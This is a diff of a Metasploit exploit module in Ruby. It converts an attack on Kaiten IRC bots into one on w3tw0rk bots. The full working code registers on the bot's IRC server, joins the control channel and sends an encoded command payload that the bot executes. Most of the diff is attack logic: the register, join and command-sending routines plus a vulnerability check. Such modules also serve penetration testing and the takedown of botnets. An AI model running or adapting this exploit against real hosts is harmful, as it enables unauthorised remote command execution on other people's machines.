@@ -5,8 +5,8 @@
 
 require 'msf/core'
 
-
 class Metasploit3 < Msf::Exploit::Remote
+
   Rank = ExcellentRanking
 
   include Msf::Exploit::Remote::Tcp
@@ -26,8 +26,8 @@ class Metasploit3 < Msf::Exploit::Remote
       'License'        => MSF_LICENSE,
       'References'     =>
         [
-          [ 'URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/shellshock-vulnerability-downloads-kaiten-source-code/' ],
-          [ 'URL', 'http://blog.malwaremustdie.org/2013/05/story-of-unix-trojan-tsunami-ircbot-w.html' ] #MalwareMustDie
+          [ 'OSVDB', '120384' ],
+          [ 'EDB', '36652' ]
         ],
       'Platform'       => %w{ unix win },
       'Arch'           => ARCH_CMD,
@@ -37,12 +37,12 @@ class Metasploit3 < Msf::Exploit::Remote
           'DisableNops' => true,
           'Compat'      =>
             {
-              'PayloadType' => 'cmd',
+              'PayloadType' => 'cmd'
             }
         },
       'Targets'  =>
         [
-          [ 'kaiten', { } ]
+          [ 'w3tw0rk', { } ]
         ],
       'Privileged'     => false,
       'DisclosureDate' => 'Oct 16 2015',
@@ -60,14 +60,14 @@ class Metasploit3 < Msf::Exploit::Remote
   def check
     connect
 
-    response = register(sock)
-    if response =~ /463/ or response =~ /464/
+    res = register(sock)
+    if res =~ /463/ || res =~ /464/
       vprint_error("#{peer} - Connection to the IRC Server not allowed")
       return Exploit::CheckCode::Unknown
     end
 
-    response = join(sock)
-    if not response =~ /353/ and not response =~ /366/
+    res = join(sock)
+    if !res =~ /353/ && !res =~ /366/
       vprint_error("#{peer} - Error joining the #{datastore['CHANNEL']} channel")
       return Exploit::CheckCode::Unknown
     end
@@ -75,10 +75,10 @@ class Metasploit3 < Msf::Exploit::Remote
     quit(sock)
     disconnect
 
-    if response =~ /auth/ and response =~ /logged in/
-      return Exploit::CheckCode::Vulnerable
+    if res =~ /auth/ && res =~ /logged in/
+      Exploit::CheckCode::Vulnerable
     else
-      return Exploit::CheckCode::Safe
+      Exploit::CheckCode::Safe
     end
   end
 
@@ -87,7 +87,7 @@ class Metasploit3 < Msf::Exploit::Remote
     data = ""
     begin
       read_data = sock.get_once(-1, 1)
-      while not read_data.nil?
+      while !read_data.nil?
         data << read_data
         read_data = sock.get_once(-1, 1)
       end
@@ -101,7 +101,7 @@ class Metasploit3 < Msf::Exploit::Remote
   def register(sock)
     msg = ""
 
-    if datastore['IRC_PASSWORD'] and not datastore['IRC_PASSWORD'].empty?
+    if datastore['IRC_PASSWORD'] && !datastore['IRC_PASSWORD'].empty?
       msg << "PASS #{datastore['IRC_PASSWORD']}\r\n"
     end
 
@@ -113,23 +113,20 @@ class Metasploit3 < Msf::Exploit::Remote
     end
 
     msg << "NICK #{nick}\r\n"
-    msg << "USER #{nick} #{Rex::Socket.source_address(peer} :#{nick}\r\n"
+    msg << "USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\r\n"
 
-    response = send_msg(sock,msg)
-    return response
+    send_msg(sock,msg)
   end
 
   def join(sock)
     join_msg = "JOIN #{datastore['CHANNEL']}\r\n"
-    response = send_msg(sock, join_msg)
-    return response
+    send_msg(sock, join_msg)
   end
 
   def kaiten_command(sock)
     encoded = payload.encoded
-    command_msg = "PRIVMSG #{datastore['CHANNEL']} :!* SH #{encoded}\r\n"
-    response = send_msg(sock, command_msg)
-    return response
+    command_msg = "PRIVMSG #{datastore['CHANNEL']} :!bot #{encoded}\r\n"
+    send_msg(sock, command_msg)
   end
 
   def quit(sock)
@@ -141,15 +138,15 @@ class Metasploit3 < Msf::Exploit::Remote
     connect
 
     print_status("#{peer} - Registering with the IRC Server...")
-    response = register(sock)
-    if response =~ /463/ or response =~ /464/
+    res = register(sock)
+    if res =~ /463/ || res =~ /464/
       print_error("#{peer} - Connection to the IRC Server not allowed")
       return
     end
 
     print_status("#{peer} - Joining the #{datastore['CHANNEL']} channel...")
-    response = join(sock)
-    if not response =~ /353/ and not response =~ /366/
+    res = join(sock)
+    if !res =~ /353/ && !res =~ /366/
       print_error("#{peer} - Error joining the #{datastore['CHANNEL']} channel")
       return
     end
@@ -160,4 +157,5 @@ class Metasploit3 < Msf::Exploit::Remote
     quit(sock)
     disconnect
   end
+
 end
